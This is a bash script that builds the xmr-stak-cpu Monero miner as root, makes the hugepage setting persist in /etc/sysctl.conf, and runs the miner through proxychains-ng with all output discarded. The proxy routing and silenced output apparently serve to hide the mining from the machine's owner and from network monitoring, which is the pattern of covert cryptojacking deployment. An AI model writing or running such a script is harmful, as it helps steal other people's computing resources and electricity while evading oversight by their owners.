#!/bin/bash
sudo sysctl -w vm.nr_hugepages=128

	sudo apt-get install cmake -y
	cd /xmr
	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
	cd /xmr/xmr/xmr-stak-cpu
	sudo cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF -DHWLOC_ENABLE=OFF
	sudo make
	sudo make install
	sudo chmod +x /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu	
 	sudo chmod +x /xmr/xmr/proxychains-ng/proxychains4	
 	sudo chmod +x /xmr/xmr/proxychains-ng/libproxychains4.so
	sudo cp /xmr/xmr/xmr/config.txt /xmr/xmr/xmr-stak-cpu/bin/config.txt
        cd /xmr/xmr/xmr-stak-cpu/bin/
        sudo /xmr/xmr/proxychains-ng/proxychains4 -f /xmr/xmr/proxychains/proxychains.conf /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
        
        sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"

